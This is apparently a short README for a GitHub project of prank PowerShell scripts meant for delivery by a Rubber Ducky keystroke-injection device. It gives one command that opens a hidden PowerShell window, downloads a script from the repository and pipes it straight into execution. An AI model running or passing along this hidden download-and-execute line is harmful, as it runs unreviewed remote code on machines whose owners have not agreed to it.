# RubberyPico
This is a small little project that contains a few funny powershell scripts. The scripts are designed to be downloaded and executed in the background by a rubber ducky.

# Executing the script using the windows run dialog box
To download and run a script from this reposetory just enter the following string into the run dialog. Just replace SCRIPT with the folder name you want to use
```
powershell -windowstyle hidden -command ". { iwr -useb https://raw.githubusercontent.com/ToastyBoiiiii/RubberyPico/main/SCRIPT/script.ps1 } | iex"
```
